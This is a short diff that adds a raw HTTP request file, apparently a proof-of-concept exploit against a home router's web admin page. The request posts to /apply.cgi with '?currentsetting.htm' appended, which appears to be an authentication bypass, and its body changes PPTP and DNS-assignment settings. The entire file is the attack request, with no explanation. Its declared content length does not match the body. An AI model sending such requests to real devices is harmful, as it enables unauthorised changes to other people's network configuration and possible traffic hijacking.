@@ -1,0 +1,7 @@
+POST /apply.cgi?currentsetting.htm HTTP/1.1
+HOST: 192.168.0.50
+Cookie: uid=xhyxhy
+Content-Type: text/html
+Content-Length: 50
+
+submit_flag=pptp&DNSAssign=1
